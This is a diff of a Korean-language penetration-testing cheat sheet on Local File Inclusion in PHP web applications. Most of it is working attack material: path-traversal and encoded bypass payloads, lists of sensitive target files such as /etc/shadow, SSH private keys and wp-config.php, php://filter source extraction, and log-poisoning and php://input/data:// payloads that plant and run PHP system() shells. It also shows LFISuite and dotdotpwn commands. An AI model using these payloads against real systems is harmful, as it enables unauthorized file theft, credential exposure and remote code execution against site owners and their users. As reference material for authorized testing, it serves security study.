@@ -1,337 +1,123 @@
 ---
-sidebar_position: 3
+sidebar_position: 2
+title: Local File Inclusion (LFI)
 ---
 
-# Local File Inclusion (LFI)
+# Local File Inclusion (LFI) 취약점 진단
 
-## 기본 LFI
+## Overview
 
-```
-http://<RHOST>/<FILE>.php?file=
-http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
-http://<RHOST>/<FILE>.php?file=../../../../../../../../../../etc/passwd
-```
+**LFI**: 웹 애플리케이션이 외부 사용자 입력을 통해 로컬 파일 시스템 내 파일을 동적으로 포함(Include)시킬 때, 필터링 부재로 인해 의도치 않은 시스템 민감 파일을 읽거나 코드를 실행하게 되는 취약점
 
-## Null Byte (PHP 5.3 이전)
+- **발생 조건**: 경로 변경(`../`) 입력 허용, 웹 프로세스 읽기 권한, 파일 존재
+- **위험성**: 시스템 민감 정보(설정 파일, 암호 해시, 개인키 등) 유출 및 RCE(Remote Code Execution) 연계 가능
 
-```
-http://<RHOST>/<FILE>.php?file=../../../../../../../../../../etc/passwd%00
-```
+---
 
-### Null Byte 인코딩
+## 1. Reconnaissance (타겟 파일 열거)
 
-```
-%00
-0x00
-```
-
-## Encoded Traversal Strings
-
-```
-../
-..\
-..\/
-%2e%2e%2f
-%252e%252e%252f
-%c0%ae%c0%ae%c0%af
-%uff0e%uff0e%u2215
-%uff0e%uff0e%u2216
-..././
-...\.\
+### 주요 시스템 및 설정 파일 (Linux)
+```bash
+/etc/passwd                   # 시스템 사용자 목록
+/etc/shadow                   # 패스워드 해시 (루트 권한 필요)
+/etc/hosts                    # 호스트 IP 매핑 정보
+/etc/apache2/apache2.conf     # Apache 설정
+/etc/nginx/nginx.conf         # Nginx 설정
+/var/log/apache2/access.log   # Apache 접속 로그
+/var/log/auth.log             # 인증 로그
 ```
 
-## php://filter Wrapper
-
-```
-# Base64로 소스 코드 읽기
-url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
-
-http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
-http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
-
-# 디코딩
-base64 -d <FILE>.php
-```
-
-## Django, Rails, Node.js Header LFI
-
-```
-Accept: ../../../../.././../../../../etc/passwd{{
-Accept: ../../../../.././../../../../etc/passwd{%0D
-Accept: ../../../../.././../../../../etc/passwd{%0A
-Accept: ../../../../.././../../../../etc/passwd{%00
-Accept: ../../../../.././../../../../etc/passwd{%0D{{
-Accept: ../../../../.././../../../../etc/passwd{%0A{{
-Accept: ../../../../.././../../../../etc/passwd{%00{{
-```
-
-## Linux 주요 파일
-
-### 시스템 설정
-
-```
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/fstab
-/etc/issue
-/etc/motd
-/etc/profile
-/etc/bashrc
-/etc/resolv.conf
-/etc/network/interfaces
-/etc/networks
-/etc/lsb-release
-/etc/redhat-release
-```
-
-### Apache/Web 서버
-
-```
-/etc/apache2/apache2.conf
-/etc/apache2/httpd.conf
-/etc/apache2/sites-enabled/000-default.conf
-/etc/httpd/conf/httpd.conf
-/etc/httpd/httpd.conf
-/etc/httpd/logs/access_log
-/etc/httpd/logs/error_log
-/etc/lighttpd.conf
-/opt/lampp/etc/httpd.conf
-/usr/local/apache/conf/httpd.conf
-/usr/local/apache/logs/access_log
-/usr/local/apache/logs/error_log
-/var/log/apache2/access.log
-/var/log/apache2/error.log
-/var/log/apache/access_log
-/var/log/apache/error_log
-/var/www/logs/access.log
-/var/www/logs/error.log
-```
-
-### PHP 설정
-
-```
-/etc/php.ini
-/etc/php/apache/php.ini
-/etc/php/apache2/php.ini
-/etc/php5/apache2/php.ini
-/etc/php/cgi/php.ini
-/usr/local/etc/php.ini
-/usr/lib/php.ini
-/opt/xampp/etc/php.ini
-```
-
-### MySQL/Database
-
-```
-/etc/my.cnf
-/etc/mysql/my.cnf
-/var/lib/mysql/my.cnf
-/var/lib/mysql/mysql/user.MYD
-```
-
-### SSH
-
-```
-/etc/ssh/ssh_config
-/etc/ssh/sshd_config
-/etc/ssh/ssh_host_dsa_key
-/etc/ssh/ssh_host_key
-/root/.ssh/id_rsa
-/root/.ssh/id_dsa
-/root/.ssh/authorized_keys
-~/.ssh/authorized_keys
-~/.ssh/id_rsa
-~/.ssh/id_dsa
-```
-
-### Cron
-
-```
-/etc/crontab
-/etc/cron.allow
-/etc/cron.deny
-/var/spool/cron/crontabs/root
-```
-
-### FTP
-
-```
-/etc/ftpaccess
-/etc/ftpchroot
-/etc/ftphosts
-/etc/pure-ftpd.conf
-/etc/proftpd/proftpd.conf
-/etc/vsftpd.conf
-/var/log/vsftpd.log
-/var/log/pureftpd.log
-```
-
-### 로그 파일
-
-```
-/var/log/auth.log
-/var/log/boot
-/var/log/daemon.log
-/var/log/debug
-/var/log/dmesg
-/var/log/dpkg.log
-/var/log/faillog
-/var/log/kern.log
-/var/log/lastlog
-/var/log/mail.log
-/var/log/messages
-/var/log/secure
-/var/log/syslog
-/var/log/wtmp
-/var/log/xferlog
-/var/log/yum.log
-```
-
-### 사용자 히스토리
-
-```
-~/.bash_history
-~/.bashrc
-~/.bash_profile
-~/.bash_logout
-~/.mysql_history
-~/.nano_history
-~/.php_history
-~/.viminfo
-~/.profile
-~/.login
-~/.logout
-```
-
-### /proc 파일 시스템
-
-```
-/proc/cmdline
-/proc/cpuinfo
-/proc/filesystems
-/proc/meminfo
-/proc/modules
-/proc/mounts
-/proc/net/arp
-/proc/net/tcp
-/proc/net/udp
-/proc/<PID>/cmdline
-/proc/<PID>/maps
-/proc/self/environ
-/proc/self/cwd/app.py
-/proc/version
-```
-
-## Windows 주요 파일
-
-### 시스템 파일
-
-```
+### 주요 시스템 및 설정 파일 (Windows)
+```bash
 C:/boot.ini
-C:/WINDOWS/win.ini
-C:/WINNT/win.ini
 C:/WINDOWS/System32/drivers/etc/hosts
+C:/xampp/apache/logs/access.log     # XAMPP Apache 접속 로그
+C:/Windows/Panther/Unattend.xml     # 무인 설치 응답 파일 (평문 암호 존재 가능)
 ```
 
-### SAM/레지스트리
-
-```
-C:/WINDOWS/Repair/SAM
-C:/Windows/repair/system
-C:/Windows/repair/software
-C:/Windows/repair/security
-C:/Windows/system32/config/regback/default
-C:/Windows/system32/config/regback/sam
-C:/Windows/system32/config/regback/security
-C:/Windows/system32/config/regback/system
-C:/Windows/system32/config/regback/software
-C:/Users/Administrator/NTUser.dat
-C:/Documents and Settings/Administrator/NTUser.dat
+### 사용자 민감 파일
+```bash
+~/.bash_history               # 쉘 명령어 히스토리
+~/.ssh/id_rsa                 # SSH 개인키
+~/.ssh/authorized_keys        # 허용된 SSH 공개키
+/var/www/html/wp-config.php   # 워드프레스 설정 파일 (DB 크리덴셜)
 ```
 
-### 이벤트 로그
+---
 
-```
-C:/Windows/system32/config/AppEvent.Evt
-C:/Windows/system32/config/SecEvent.Evt
-```
+## 2. Exploitation
 
-### 설치 로그
+### 기본 경로 탐색 (Path Traversal)
+```bash
+# 절대 경로 접근
+http://<target>/index.php?file=/etc/passwd
 
-```
-C:/Windows/Panther/Unattend/Unattended.xml
-C:/Windows/Panther/Unattended.xml
-C:/Windows/debug/NetSetup.log
+# 상대 경로 접근 (Directory Traversal)
+http://<target>/index.php?file=../../../../../../../../etc/passwd
 ```
 
-### Apache/PHP (Windows)
+### PHP Wrapper를 활용한 파일 읽기
+`.php` 확장자가 자동으로 붙거나 렌더링되어 소스코드가 보이지 않을 때 Base64로 인코딩하여 출력
+```bash
+# php://filter를 이용해 소스코드를 Base64로 추출
+http://<target>/index.php?file=php://filter/convert.base64-encode/resource=index.php
 
-```
-C:/apache/logs/access.log
-C:/apache/logs/error.log
-C:/apache/php/php.ini
-C:/php/php.ini
-C:/php4/php.ini
-C:/php5/php.ini
-C:/WINDOWS/php.ini
-C:/WINNT/php.ini
-C:/Program Files/Apache Group/Apache2/conf/httpd.conf
-C:/Program Files/Apache Group/Apache/conf/httpd.conf
-C:/Program Files/Apache Group/Apache/logs/access.log
-C:/Program Files/Apache Group/Apache/logs/error.log
-C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
-C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+# 추출한 Base64 디코딩 (공격자 환경)
+echo "<base64_string>" | base64 -d
 ```
 
-### XAMPP
+### RCE (원격 코드 실행) 전환 공격
+LFI를 통해 단순 파일 읽기를 넘어 시스템 명령을 실행하는 연계 공격
 
-```
-C:/xampp/apache/bin/php.ini
-C:/xampp/apache/logs/access.log
-C:/xampp/apache/logs/error.log
-C:/xampp/apache/conf/httpd.conf
-C:/Program Files (x86)/xampp/apache/conf/httpd.conf
-```
+**1. Log Poisoning (로그 변조)**
+웹 서버 로그 파일에 PHP 코드를 남기고, LFI로 해당 로그 파일을 호출하여 실행
+```bash
+# 1. User-Agent 헤더 등에 악성 PHP 코드 삽입 후 접근
+curl -A "<?php system(\$_GET['cmd']); ?>" http://<target>/
 
-### MySQL (Windows)
-
-```
-C:/MySQL/my.cnf
-C:/MySQL/my.ini
-C:/MySQL/data/hostname.err
-C:/MySQL/data/mysql.log
-C:/Program Files/MySQL/my.ini
-C:/Program Files/MySQL/my.cnf
-C:/Program Files/MySQL/data/hostname.err
-C:/Program Files/MySQL/data/mysql.log
-C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
-C:/Program Files/MySQL/MySQL Server 5.0/my.ini
-C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+# 2. LFI 취약점으로 로그 파일을 Include 하면서 명령어 전달
+http://<target>/index.php?file=/var/log/apache2/access.log&cmd=whoami
 ```
 
-### FileZilla
+**2. php://input 및 data:// 활용**
+```bash
+# POST body에 입력한 PHP 코드를 직접 실행
+curl -X POST --data "<?php system('whoami'); ?>" "http://<target>/index.php?file=php://input"
 
-```
-C:/Program Files/FileZilla Server/FileZilla Server.xml
-C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
-```
-
-### IIS
-
-```
-C:/inetpub/wwwroot/global.asa
-C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
-C:/Windows/System32/inetsrv/config/applicationHost.config
-C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+# 데이터 URI를 통해 직접 Base64 인코딩된 코드 실행
+# Base64: <?php system('id'); ?>
+http://<target>/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
 ```
 
-## 참고
+---
 
-- Path Traversal로 상위 디렉토리 이동
-- Null Byte는 PHP 5.3 이전에만 작동
-- php://filter로 소스 코드 읽기
-- /proc 파일 시스템은 Linux에서 유용
-- Windows는 대소문자 구분 안 함
-- 로그 파일에서 명령 실행 가능 (Log Poisoning)
+## 3. Advanced Techniques
+
+### 필터링 우회 (Bypass) 기법
+```bash
+# 1. Null Byte 삽입 (PHP 5.3.4 이전 버전) - 강제 확장자 우회
+http://<target>/index.php?file=../../../etc/passwd%00
+
+# 2. 필터 제거 우회 (치환 필터가 한 번만 동작할 때)
+....//....//....//etc/passwd
+
+# 3. URL 인코딩 및 이중 인코딩
+%2e%2e%2f                     # ../ (1차 인코딩)
+%252e%252e%252f               # ../ (2차 인코딩)
+```
+
+### 헤더(Header) 기반 LFI (Django, Node.js 등)
+일부 프레임워크 템플릿 처리 시 Accept 헤더 등에서 발생
+```http
+Accept: ../../../../.././../../../../etc/passwd{{
+Accept: ../../../../.././../../../../etc/passwd{%00
+```
+
+### LFI 자동화 도구
+```bash
+# [LFISuite] 자동화된 페이로드 주입 및 쉘 획득 도구
+git clone https://github.com/D35m0nd142/LFISuite.git
+
+# [dotdotpwn] Directory Traversal 퍼저
+dotdotpwn -m http -h <target> -x 80 -f /etc/passwd
+```
